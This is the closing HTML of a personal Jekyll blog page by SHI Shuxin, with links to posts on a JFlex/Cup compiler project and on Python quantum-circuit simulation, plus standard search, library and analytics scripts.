- 编译课项目二 - 基于 Jflex 词法分析器和 Cup 句法解析器实现编译器前端</p></a> <a href="/posts/Simulation-quantum-computing-python/" class="btn btn-outline-primary" prompt="Newer"><p>专业课 - 使用 Python 模拟量子计算电路</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/Shuxin_SHI">SHI Shuxin</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/leetcode/">LeetCode</a> <a class="post-tag" href="/tags/block-chain/">Block chain</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/parser/">Parser</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/backend/">Backend</a> <a class="post-tag" href="/tags/blog/">Blog</a> <a class="post-tag" href="/tags/compilation/">Compilation</a> <a class="post-tag" href="/tags/functional-programming/">Functional Programming</a> <a class="post-tag" href="/tags/java/">Java</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
